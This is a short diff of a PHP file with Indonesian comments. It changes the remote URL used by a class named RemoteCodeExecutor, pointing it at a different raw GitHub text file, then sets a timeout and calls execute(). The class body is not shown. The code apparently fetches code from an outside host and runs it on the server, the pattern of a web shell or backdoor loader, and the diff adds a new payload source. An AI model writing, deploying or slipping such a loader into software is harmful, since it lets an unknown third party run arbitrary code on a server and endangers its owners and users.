@@ -78,7 +78,7 @@ class RemoteCodeExecutor {
 
 // Penggunaan
 try {
-    $executor = new RemoteCodeExecutor('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/1.txt');
+    $executor = new RemoteCodeExecutor('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/3.txt');
     $executor->setTimeout(15);
     $executor->execute();
 } catch (Exception $e) {
